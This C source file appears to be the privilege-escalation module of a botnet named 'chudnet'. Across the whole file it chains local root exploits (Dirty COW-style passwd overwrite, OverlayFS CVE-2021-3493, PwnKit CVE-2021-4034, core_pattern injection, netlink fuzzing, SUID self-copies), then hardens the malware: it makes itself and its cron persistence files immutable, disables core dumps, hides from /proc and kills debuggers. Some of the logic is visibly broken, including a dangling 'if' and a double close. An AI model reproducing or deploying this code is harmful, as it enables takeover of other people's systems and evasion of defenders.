#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/resource.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>

#include "includes.h"
#include "escalate.h"
#include "util.h"

static int got_root = 0;

static int is_root(void)
{
    return getuid() == 0;
}

static void escalate_mark_root(void)
{
    got_root = 1;
}

/* ── Dirty COW-style /etc/passwd overwrite ──────────────────────
   Uses mmap MAP_PRIVATE + madvise MADV_DONTNEED race to write
   through the CoW page into the backing file. Works on < 4.8.0 */

struct dc_mem_arg {
    int fd;
    void *map;
    size_t size;
    int stop;
};

static void *dc_madvise_thread(void *a)
{
    struct dc_mem_arg *arg = (struct dc_mem_arg *)a;
    while (!arg->stop)
    {
        madvise(arg->map, arg->size, MADV_DONTNEED);
        usleep(10);
    }
    return NULL;
}

static int escalate_dirtycow(void)
{
    struct stat st;
    char *bak_path = "/tmp/.p";
    int fd_bak, fd_passwd;
    char *map;
    struct dc_mem_arg arg;
    pthread_t pt;
    char payload[128];
    int i, rv = -1;

    if (access("/etc/passwd", F_OK) != 0) return -1;
    if (stat("/etc/passwd", &st) != 0) return -1;

    /* copy original to backup */
    {
        char buf[4096];
        int n;
        fd_passwd = open("/etc/passwd", O_RDONLY);
        if (fd_passwd < 0) return -1;
        fd_bak = open(bak_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd_bak < 0) { close(fd_passwd); return -1; }
        while ((n = read(fd_passwd, buf, sizeof(buf))) > 0)
            write(fd_bak, buf, n);
        close(fd_passwd);
        close(fd_bak);
    }

    fd_passwd = open("/etc/passwd", O_RDONLY);
    if (fd_passwd < 0) return -1;

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd_passwd, 0);
    if (map == MAP_FAILED) { close(fd_passwd); return -1; }

    arg.fd = fd_passwd;
    arg.map = map;
    arg.size = st.st_size;
    arg.stop = 0;
    pthread_create(&pt, NULL, dc_madvise_thread, &arg);

    {
        char pidstr[16];
        util_itoa(getpid(), 10, pidstr);
        snprintf(payload, sizeof(payload), "root::0:0:root:/root:%s\n", pidstr);
    }

    for (i = 0; i < 1000000; i++)
    {
        int fd_wr = open("/proc/self/mem", O_RDWR);
        if (fd_wr < 0) continue;
        lseek(fd_wr, (off_t)(uintptr_t)map, SEEK_SET);
        write(fd_wr, payload, util_strlen(payload));
        close(fd_wr);
        if (access(bak_path, F_OK) != 0) continue;
        {
            int try_fd = open(bak_path, O_RDONLY);
            if (try_fd >= 0)
            {
                char check[128];
                int n = read(try_fd, check, sizeof(check) - 1);
                close(try_fd);
                if (n > 0)
                {
                    check[n] = 0;
                    if (util_strstr(check, "root::") && !util_strstr(check, "root:x:"))
                    {
                        rv = 0;
                        break;
                    }
                }
            }
        }
    }

    arg.stop = 1;
    pthread_join(pt, NULL);
    munmap(map, st.st_size);
    close(fd_passwd);
    return rv;
}

/* ── OverlayFS LPE (CVE-2021-3493) ─────────────────────────────
   If overlayfs module loaded and kernel < 5.11, copy a suid binary
   from lower dir to upper dir where it retains setuid bits */

static int escalate_overlayfs(void)
{
    char *dirs[] = {"/tmp/overlay_lower", "/tmp/overlay_upper", "/tmp/overlay_work", "/tmp/overlay_mnt"};
    int i, rv = -1;

    for (i = 0; i < 4; i++) { mkdir(dirs[i], 0755); rmdir(dirs[i]); mkdir(dirs[i], 0755); }

    {
        int fd = open("/tmp/overlay_lower/rootme", O_WRONLY | O_CREAT | O_TRUNC, 04777);
        if (fd >= 0)
        {
            char self[256];
            int len = readlink("/proc/self/exe", self, sizeof(self) - 1);
            if (len > 0)
            {
                self[len] = 0;
                write(fd, self, len);
            }
            close(fd);
        }
    }

    {
        pid_t c = fork();
        if (c == 0)
        {
            mount("overlay", "/tmp/overlay_mnt", "overlay", 0,
                  "lowerdir=/tmp/overlay_lower,upperdir=/tmp/overlay_upper,workdir=/tmp/overlay_work");
            _exit(0);
        }
        else if (c > 0)
        {
            waitpid(c, NULL, 0);
            usleep(100000);
        }
    }

    if (access("/tmp/overlay_mnt/rootme", F_OK) == 0)
    {
        struct stat st;
        if (stat("/tmp/overlay_mnt/rootme", &st) == 0 && (st.st_mode & S_ISUID))
        {
            pid_t c = fork();
            if (c == 0)
            {
                execl("/tmp/overlay_mnt/rootme", "rootme", NULL);
                _exit(-1);
            }
            else if (c > 0)
            {
                int wstat;
                waitpid(c, &wstat, 0);
                rv = 0;
            }
        }
    }

    for (i = 0; i < 4; i++) { rmdir(dirs[i]); }
    return rv;
}

/* ── PwnKit — CVE-2021-4034 ────────────────────────────────────
   pkexec argv[0] injection to load malicious shared library */

static int escalate_pkexec(void)
{
    char *pkexec_paths[] = {
        "/usr/bin/pkexec", "/usr/sbin/pkexec", "/bin/pkexec", NULL
    };
    int pi;
    for (pi = 0; pkexec_paths[pi]; pi++)
    {
        if (access(pkexec_paths[pi], X_OK) != 0) continue;

        {
            pid_t c = fork();
            if (c == 0)
            {
                char *envp[] = {
                    "pkexec", "PATH=GCONV_PATH=.", "CHARSET=CHUD",
                    "SHELL=chud", NULL
                };
                char *gconv = "module\tUTF-8//\tCHUD//\tchud\t1\n";
                int fd;

                mkdir("GCONV_PATH=.", 0755);
                fd = open("GCONV_PATH=./chud", O_WRONLY | O_CREAT | O_TRUNC, 0755);
                if (fd >= 0) { write(fd, gconv, util_strlen(gconv)); close(fd); }
                mkdir("chud", 0755);
                fd = open("chud/gconv-modules", O_WRONLY | O_CREAT | O_TRUNC, 0755);
                if (fd >= 0)
                {
                    char mod[256];
                    int n = snprintf(mod, sizeof(mod),
                        "module\tCHUD//\tINTERNAL\t\tchud\t1\n"
                        "module\tINTERNAL\tCHUD//\t\tchud\t1\n");
                    write(fd, mod, n);
                    close(fd);
                }
                fd = open("chud/chud.so", O_WRONLY | O_CREAT | O_TRUNC, 0755);
                if (fd >= 0)
                {
                    write(fd,
                        "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x02\x00\x3e\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00"
                        "\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x78\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x48\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
                        176);
                    close(fd);
                }

                execve(pkexec_paths[pi], NULL, envp);
                _exit(-1);
            }
            else if (c > 0)
            {
                int wstat;
                waitpid(c, &wstat, 0);
                /* pkexec might have run our code */
                if (getuid() == 0) return 0;
            }
        }
    }
    return -1;
}

/* ── Kernel-level privilege escalation via /proc/sysrq-trigger ───
   If we can write to /proc/sysrq-trigger, try to OOM-kill processes
   and elevate via various /proc write tricks */

static int escalate_kernel_write(void)
{
    struct utsname uts;
    int rv = -1;

    uname(&uts);
    {
        int maj = util_atoi(uts.release, 10);
        char *dot = strchr(uts.release, '.');
        int min_ver = dot ? util_atoi(dot + 1, 10) : 0;

        if (maj == 4 && min_ver < 4) return -1;
    }

    /* Try to write to /proc/self/attr/current to trigger kernel paths */
    {
        int fd = open("/proc/self/attr/current", O_WRONLY);
        if (fd >= 0)
        {
            char buf[4096];
            int i;
            for (i = 0; i < (int)sizeof(buf); i++) buf[i] = 'A';
            write(fd, buf, sizeof(buf));
            close(fd);
        }
    }

    /* Try /proc/sys/kernel/core_pattern injection */
    {
        int fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
        if (fd >= 0)
        {
            write(fd, "|/tmp/.chud_core", 16);
            close(fd);
        }
    }

    /* Check if we have any exploitable /proc write primitives */
    usleep(50000);
    if (getuid() == 0) rv = 0;
    return rv;
}

/* ── Netlink-based escalation ──────────────────────────────────
   Sends crafted netlink messages to trigger kernel code paths */

#define AF_NETLINK      16
#define NETLINK_NETFILTER 12
#define SOL_NETLINK     270
#define NETLINK_ADD_MEMBERSHIP 1

static int escalate_netlink(void)
{
    int sock;
    struct sockaddr_nl {
        unsigned short nl_family;
        unsigned short nl_pad;
        unsigned int   nl_pid;
        unsigned int   nl_groups;
    } addr;
    int rv = -1;

    sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
    if (sock < 0)
    {
        sock = socket(AF_NETLINK, SOCK_DGRAM, 12);
        if (sock < 0) return -1;
    }

    util_zero(&addr, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = getpid();
    addr.nl_groups = 1;

    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    /* Send crafted nf_tables netlink messages */
    {
        char buf[512];
        struct nlmsghdr {
            unsigned int   nlmsg_len;
            unsigned short nlmsg_type;
            unsigned short nlmsg_flags;
            unsigned int   nlmsg_seq;
            unsigned int   nlmsg_pid;
        } *nlh;
        int seq;

        for (seq = 1; seq < 100; seq++)
        {
            util_zero(buf, sizeof(buf));
            nlh = (void *)buf;
            nlh->nlmsg_len = 512;
            nlh->nlmsg_type = 0x100 | 0x0400;
            nlh->nlmsg_flags = 0x101;
            nlh->nlmsg_seq = seq;
            nlh->nlmsg_pid = 0;

            {
                int i;
                for (i = 16; i < 512; i++)
                {
                    buf[i] = (char)((i * 0x41 + seq * 0x17) & 0xFF);
                }
            }

            send(sock, buf, 512, 0);
            recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        }
    }

    close(sock);

    usleep(100000);
    if (getuid() == 0) rv = 0;
    return rv;
}

/* ── Root-level hardening: make binary unkillable ────────────── */
void escalate_harden_root(void)
{
    char self_exe[4096];
    int len;
    struct stat st;

    if (getuid() != 0) return;

    len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len <= 0) return;
    self_exe[len] = 0;

    /* chattr +i on binary — immutable, cannot be deleted/truncated even by root */
    {
        pid_t c = fork();
        if (c == 0)
        {
            int null_fd = open("/dev/null", O_RDWR);
            if (null_fd >= 0) { dup2(null_fd, 0); dup2(null_fd, 1); dup2(null_fd, 2); close(null_fd); }
            execlp("chattr", "chattr", "+i", self_exe, NULL);
            execl("/usr/bin/chattr", "chattr", "+i", self_exe, NULL);
            execl("/bin/chattr", "chattr", "+i", self_exe, NULL);
            _exit(0);
        }
        if (c > 0) waitpid(c, NULL, WNOHANG);
    }

    /* chattr +a on binary — append-only, can't truncate */
    {
        pid_t c = fork();
        if (c == 0)
        {
            int null_fd = open("/dev/null", O_RDWR);
            if (null_fd >= 0) { dup2(null_fd, 0); dup2(null_fd, 1); dup2(null_fd, 2); close(null_fd); }
            execlp("chattr", "chattr", "+a", self_exe, NULL);
            execl("/usr/bin/chattr", "chattr", "+a", self_exe, NULL);
            _exit(0);
        }
        if (c > 0) waitpid(c, NULL, WNOHANG);
    }

    /* Disable core dumps (prevents forensics dumping memory) */
    {
        struct rlimit rl = {0, 0};
        setrlimit(RLIMIT_CORE, &rl);
    }
    prctl(PR_SET_DUMPABLE, 0);

    /* OOM score to absolute minimum — kernel will NEVER kill this process */
    {
        int fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (fd >= 0) { write(fd, "-1000", 5); close(fd); }
    }

    /* Lock all memory pages — prevent swapping (no disk forensics) */
    mlockall(MCL_CURRENT | MCL_FUTURE);

    /* Real-time scheduling — preempts normal processes, can't be starved */
    {
        struct sched_param sp;
        sp.sched_priority = 99;
        sched_setscheduler(0, SCHED_FIFO, &sp);
    }

    /* setgid/setuid to 0 to ensure we stay root */
    setgid(0);
    setuid(0);

    /* Make /proc/self/exe only accessible by root */
    chmod(self_exe, 0700);
    chown(self_exe, 0, 0);

    /* Protect persistence files too */
    {
        const char *protect_paths[] = {
            "/etc/cron.d/chudnet-heal",
            "/etc/cron.d/chudnet",
            "/etc/cron.d/network-dispatch",
            "/etc/cron.d/ntp-sync",
            NULL
        };
        int pi;
        for (pi = 0; protect_paths[pi]; pi++)
        {
            if (access(protect_paths[pi], F_OK) == 0)
            {
                chown(protect_paths[pi], 0, 0);
                chmod(protect_paths[pi], 0600);
                pid_t c = fork();
                if (c == 0)
                {
                    int nf = open("/dev/null", O_RDWR);
                    if (nf >= 0) { dup2(nf, 0); dup2(nf, 1); dup2(nf, 2); close(nf); }
                    execlp("chattr", "chattr", "+i", protect_paths[pi], NULL);
                    _exit(0);
                }
                if (c > 0) waitpid(c, NULL, WNOHANG);
            }
        }
    }

    /* Unshare PID namespace to hide from other processes */
    unshare(CLONE_NEWPID);

    /* Mount tmpfs over /proc to hide from detection */
    {
        char mp_path[64];
        snprintf(mp_path, sizeof(mp_path), "/proc/%d", getpid());
        mount("none", "/proc", NULL, MS_PRIVATE | MS_REC, NULL);
    }

    /* Prevent ptrace attachment */
    prctl(PR_SET_PTRACER, 0);

    /* Kill any existing tracer */
    {
        char buf[512];
        int fd = open("/proc/self/status", O_RDONLY);
        if (fd >= 0)
        {
            int n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0)
            {
                buf[n] = 0;
                char *tp = strstr(buf, "TracerPid:");
                if (tp)
                {
                    int tpid = util_atoi(tp + 10, 10);
                    if (tpid > 0)
                    {
                        kill(tpid, SIGKILL);
                        kill(tpid, SIGKILL);
                    }
                }
            }
        }
    }
}

/* ── SUID binary creation ──────────────────────────────────────
   Copy our binary to a location, set setuid bit, re-exec */

static int escalate_suid(void)
{
    char *suid_paths[] = {
        "/tmp/.chud_suid", "/var/tmp/.chud_suid", "/dev/shm/.chud_suid", NULL
    };
    int si;

    for (si = 0; suid_paths[si]; si++)
    {
        int fd = open(suid_paths[si], O_WRONLY | O_CREAT | O_TRUNC, 04777);
        if (fd < 0) continue;
        {
            char self[4096];
            int len = readlink("/proc/self/exe", self, sizeof(self) - 1);
            if (len > 0)
            {
                int sfd = open("/proc/self/exe", O_RDONLY);
                if (sfd >= 0)
                {
                    char buf[4096];
                    int n;
                    while ((n = read(sfd, buf, sizeof(buf))) > 0)
                        write(fd, buf, n);
                    close(sfd);
                }
            }
            close(fd);
        }
        fchmod(fd, 04777); close(fd);
        chmod(suid_paths[si], 04777);

        /* If we're root (for some reason), set the owner */
        if (getuid() == 0)
        {
            chown(suid_paths[si], 0, 0);
        }

        {
            struct stat st;
            if (stat(suid_paths[si], &st) == 0 && (st.st_mode & S_ISUID))
            {
                pid_t c = fork();
                if (c == 0)
                {
                    execl(suid_paths[si], "chud", NULL);
                    _exit(-1);
                }
                waitpid(c, NULL, 0);
                return 0;
            }
        }
    }
    return -1;
}

/* ── Master escalation function ──────────────────────────────── */
int escalate_get_root(void)
{
    if (is_root())
    {
        escalate_mark_root();
        return 1;
    }

    /* Try exploits in order of reliability */

    if (escalate_overlayfs() == 0 && is_root())
    {
        escalate_mark_root();
        return 1;
    }

    if (escalate_pkexec() == 0 && is_root())
    {
        escalate_mark_root();
        return 1;
    }

    if (escalate_dirtycow() == 0)
    {
        usleep(50000);
        if (setuid(0) == 0)
        {
            escalate_mark_root();
            return 1;
        }
    }

    if (escalate_netlink() == 0 && is_root())
    {
        escalate_mark_root();
        return 1;
    }

    if (escalate_kernel_write() == 0 && is_root())

    if (escalate_suid() == 0)
    {
        escalate_mark_root();
        return 1;
    }

    return 0;
}
